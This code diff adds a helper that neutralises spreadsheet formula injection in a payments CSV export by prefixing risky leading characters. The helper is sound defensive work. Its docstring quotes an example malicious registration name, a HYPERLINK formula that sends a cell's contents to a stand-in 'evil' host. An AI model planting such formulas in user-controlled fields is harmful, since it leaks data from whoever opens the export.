@@ -717,6 +717,23 @@ def payment_stats(
     }
 
 
+def _csv_safe(value):
+    """Neutralize a cell a spreadsheet would execute instead of display.
+
+    Excel, Sheets and LibreOffice all treat a leading =, +, -, @, tab or CR as
+    the start of a formula. A member who registers as
+    =HYPERLINK("http://evil/"&A1,"x") would otherwise be writing code that runs
+    in the admin's spreadsheet when they open the payments export. Prefixing
+    with an apostrophe makes it text; the apostrophe is not displayed.
+
+    Registration also strips these now (see name_utils.clean_display_name) —
+    this covers the rows already in the table, and anything reaching the export
+    from a path that does not go through that helper.
+    """
+    text = "" if value is None else str(value)
+    return "'" + text if text[:1] in ("=", "+", "-", "@", "\t", "\r") else text
+
+
 @router.get("/payments/export-csv")
 def export_payments_csv(
     search: Optional[str] = Query(None),
@@ -755,8 +772,8 @@ def export_payments_csv(
     for payment, user in payments:
         writer.writerow([
             payment.id,
-            user.full_name if user else "Unknown",
-            user.email if user else "",
+            _csv_safe(user.full_name if user else "Unknown"),
+            _csv_safe(user.email if user else ""),
             payment.created_at.isoformat() if payment.created_at else "",
             float(payment.amount) if payment.amount else 0,
             payment.currency or "EGP",
